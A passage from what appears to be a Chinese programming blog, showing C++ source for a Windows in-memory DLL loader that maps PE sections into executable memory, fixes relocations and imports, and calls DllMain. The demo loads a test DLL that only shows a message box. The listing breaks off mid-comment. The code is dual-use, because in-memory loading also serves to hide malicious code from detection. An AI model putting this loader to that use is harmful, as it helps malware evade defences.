class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _MM_LOAD_DLL_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _MM_LOAD_DLL_H_</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(__stdcall* typedef_DllMain)</span><span class="hljs-params">(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszText)</span></span>;<br><br><span class="hljs-comment">// 模拟LoadLibrary加载内存DLL文件到进程中</span><br><span class="hljs-comment">// lpData: 内存DLL文件数据的基址</span><br><span class="hljs-comment">// dwSize: 内存DLL文件的内存大小</span><br><span class="hljs-comment">// 返回值: 内存DLL加载到进程的加载基址</span><br><span class="hljs-function">LPVOID <span class="hljs-title">MmLoadLibrary</span><span class="hljs-params">(LPVOID lpData, DWORD dwSize)</span></span>;<br><br><span class="hljs-comment">// 根据PE结构,获取PE文件加载到内存后的镜像大小</span><br><span class="hljs-comment">// lpData: 内存DLL文件数据的基址</span><br><span class="hljs-comment">// 返回值: 返回PE文件结构中IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage值的大小</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetSizeOfImage</span><span class="hljs-params">(LPVOID lpData)</span></span>;<br><br><span class="hljs-comment">// 将内存DLL数据按SectionAlignment大小对齐映射到进程内存中</span><br><span class="hljs-comment">// lpData: 内存DLL文件数据的基址</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">MmMapFile</span><span class="hljs-params">(LPVOID lpData, LPVOID lpBaseAddress)</span></span>;<br><br><span class="hljs-comment">// 对齐SectionAlignment</span><br><span class="hljs-comment">// dwSize: 表示未对齐前内存的大小</span><br><span class="hljs-comment">// dwAlignment: 对齐大小值</span><br><span class="hljs-comment">// 返回值: 返回内存对齐之后的值</span><br><span class="hljs-function">DWORD <span class="hljs-title">Align</span><span class="hljs-params">(DWORD dwSize, DWORD dwAlignment)</span></span>;<br><br><span class="hljs-comment">// 修改PE文件重定位表信息</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoRelocationTable</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span>;<br><br><span class="hljs-comment">// 填写PE文件导入表信息</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoImportTable</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span>;<br><br><span class="hljs-comment">// 修改PE文件加载基址IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetImageBase</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span>;<br><br><span class="hljs-comment">// 调用DLL的入口函数DllMain,函数地址即为PE文件的入口点IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">CallDllMain</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span>;<br><br><span class="hljs-comment">// 模拟GetProcAddress获取内存DLL的导出函数</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL文件加载到进程中的加载基址</span><br><span class="hljs-comment">// lpszFuncName: 导出函数的名字</span><br><span class="hljs-comment">// 返回值: 返回导出函数的的地址</span><br><span class="hljs-function">LPVOID <span class="hljs-title">MmGetProcAddress</span><span class="hljs-params">(LPVOID lpBaseAddress, PCHAR lpszFuncName)</span></span>;<br><br><span class="hljs-comment">// 释放从内存加载的DLL到进程内存的空间</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">MmFreeLibrary</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>dllload.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllload.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;MmLoadDll.h&quot;</span></span><br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-type">char</span> szFileName[MAX_PATH] = <span class="hljs-string">&quot;TestDll.dll&quot;</span>;<br><span class="hljs-comment">// 打开DLL文件并获取DLL文件大小</span><br>HANDLE hFile = <span class="hljs-built_in">CreateFile</span>(szFileName, GENERIC_READ | GENERIC_WRITE,<br>FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING,<br>FILE_ATTRIBUTE_ARCHIVE, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hFile)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CreateFile&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>DWORD dwFileSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">// 申请动态内存并读取DLL到内存中</span><br>BYTE* lpData = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpData)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;new&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;dwRet, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// 将内存DLL加载到程序中</span><br>LPVOID lpBaseAddress = <span class="hljs-built_in">MmLoadLibrary</span>(lpData, dwFileSize);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpBaseAddress)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;MmLoadLibrary&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DLL加载成功\n&quot;</span>);<br><br><span class="hljs-comment">// 获取DLL导出函数并调用</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_ShowMessage)</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszText, <span class="hljs-type">char</span>* lpszCaption)</span></span>;<br>typedef_ShowMessage ShowMessage = (typedef_ShowMessage)<span class="hljs-built_in">MmGetProcAddress</span>(lpBaseAddress, <span class="hljs-string">&quot;ShowMessage&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == ShowMessage)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;MmGetProcAddress&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br>&#125;<br><span class="hljs-built_in">ShowMessage</span>(<span class="hljs-string">&quot;I am Demon·Gan\n&quot;</span>, <span class="hljs-string">&quot;Who Are You&quot;</span>);<br><br><span class="hljs-comment">// 释放从内存加载的DLL</span><br>BOOL bRet = <span class="hljs-built_in">MmFreeLibrary</span>(lpBaseAddress);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;MmFreeLirbary&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 释放</span><br><span class="hljs-keyword">delete</span>[] lpData;<br>lpData = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>MmLoadDll.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;MmLoadDll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error!\nError Code Is:%d\n&quot;</span>, lpszText, ::<span class="hljs-built_in">GetLastError</span>());<br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK | MB_ICONERROR);<br>&#125;<br><br><br><span class="hljs-comment">// 模拟LoadLibrary加载内存DLL文件到进程中</span><br><span class="hljs-comment">// lpData: 内存DLL文件数据的基址</span><br><span class="hljs-comment">// dwSize: 内存DLL文件的内存大小</span><br><span class="hljs-comment">// 返回值: 内存DLL加载到进程的加载基址</span><br><span class="hljs-function">LPVOID <span class="hljs-title">MmLoadLibrary</span><span class="hljs-params">(LPVOID lpData, DWORD dwSize)</span></span><br><span class="hljs-function"></span>&#123;<br>LPVOID lpBaseAddress = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// 获取镜像大小</span><br>DWORD dwSizeOfImage = <span class="hljs-built_in">GetSizeOfImage</span>(lpData);<br><span class="hljs-comment">// 在进程中开辟一个可读、可写、可执行的内存块</span><br>lpBaseAddress = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpBaseAddress)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-built_in">RtlZeroMemory</span>(lpBaseAddress, dwSizeOfImage);<br><span class="hljs-comment">// 将内存DLL数据按SectionAlignment大小对齐映射到进程内存中</span><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">MmMapFile</span>(lpData, lpBaseAddress))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;MmMapFile&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// 修改PE文件重定位表信息</span><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">DoRelocationTable</span>(lpBaseAddress))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;DoRelocationTable&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// 填写PE文件导入表信息</span><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">DoImportTable</span>(lpBaseAddress))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;DoImportTable&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//修改页属性。应该根据每个页的属性单独设置其对应内存页的属性。</span><br><span class="hljs-comment">//统一设置成一个属性PAGE_EXECUTE_READWRITE</span><br>DWORD dwOldProtect = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">VirtualProtect</span>(lpBaseAddress, dwSizeOfImage, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;VirtualProtect&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// 修改PE文件加载基址IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">SetImageBase</span>(lpBaseAddress))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;SetImageBase&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// 调用DLL的入口函数DllMain,函数地址即为PE文件的入口点IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">CallDllMain</span>(lpBaseAddress))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CallDllMain&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> lpBaseAddress;<br>&#125;<br><br><br><span class="hljs-comment">// 根据PE结构,获取PE文件加载到内存后的镜像大小</span><br><span class="hljs-comment">// lpData: 内存DLL文件数据的基址</span><br><span class="hljs-comment">// 返回值: 返回PE文件结构中IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage值的大小</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetSizeOfImage</span><span class="hljs-params">(LPVOID lpData)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwSizeOfImage = <span class="hljs-number">0</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage;<br><span class="hljs-keyword">return</span> dwSizeOfImage;<br>&#125;<br><br><br><span class="hljs-comment">// 将内存DLL数据按SectionAlignment大小对齐映射到进程内存中</span><br><span class="hljs-comment">// lpData: 内存DLL文件数据的基址</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">MmMapFile</span><span class="hljs-params">(LPVOID lpData, LPVOID lpBaseAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">// 获取SizeOfHeaders的值: 所有头+节表头的大小</span><br>DWORD dwSizeOfHeaders = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders;<br><span class="hljs-comment">// 获取节表的数量</span><br>WORD wNumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections;<br><span class="hljs-comment">// 获取第一个节表头的地址</span><br>PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br><span class="hljs-comment">// 加载 所有头+节表头的大小</span><br><span class="hljs-built_in">RtlCopyMemory</span>(lpBaseAddress, lpData, dwSizeOfHeaders);<br><span class="hljs-comment">// 对齐SectionAlignment循环加载节表</span><br>WORD i = <span class="hljs-number">0</span>;<br>LPVOID lpSrcMem = <span class="hljs-literal">NULL</span>;<br>LPVOID lpDestMem = <span class="hljs-literal">NULL</span>;<br>DWORD dwSizeOfRawData = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; wNumberOfSections; i++)<br>&#123;<br><span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == pSectionHeader-&gt;VirtualAddress) ||<br>(<span class="hljs-number">0</span> == pSectionHeader-&gt;SizeOfRawData))<br>&#123;<br>pSectionHeader++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>lpSrcMem = (LPVOID)((DWORD)lpData + pSectionHeader-&gt;PointerToRawData);<br>lpDestMem = (LPVOID)((DWORD)lpBaseAddress + pSectionHeader-&gt;VirtualAddress);<br>dwSizeOfRawData = pSectionHeader-&gt;SizeOfRawData;<br>::<span class="hljs-built_in">RtlCopyMemory</span>(lpDestMem, lpSrcMem, dwSizeOfRawData);<br>pSectionHeader++;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-comment">// 对齐SectionAlignment</span><br><span class="hljs-comment">// dwSize: 表示未对齐前内存的大小</span><br><span class="hljs-comment">// dwAlignment: 对齐大小值</span><br><span class="hljs-comment">// 返回值: 返回内存对齐之后的值</span><br><span class="hljs-function">DWORD <span class="hljs-title">Align</span><span class="hljs-params">(DWORD dwSize, DWORD dwAlignment)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br>DWORD i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>i = dwSize / dwAlignment;<br>j = dwSize % dwAlignment;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != j)<br>&#123;<br>i++;<br>&#125;<br>dwRet = i * dwAlignment;<br><span class="hljs-keyword">return</span> dwRet;<br>&#125;<br><br><br><span class="hljs-comment">// 修改PE文件重定位表信息</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoRelocationTable</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* 重定位表的结构：</span><br><span class="hljs-comment">// DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)</span><br><span class="hljs-comment">// 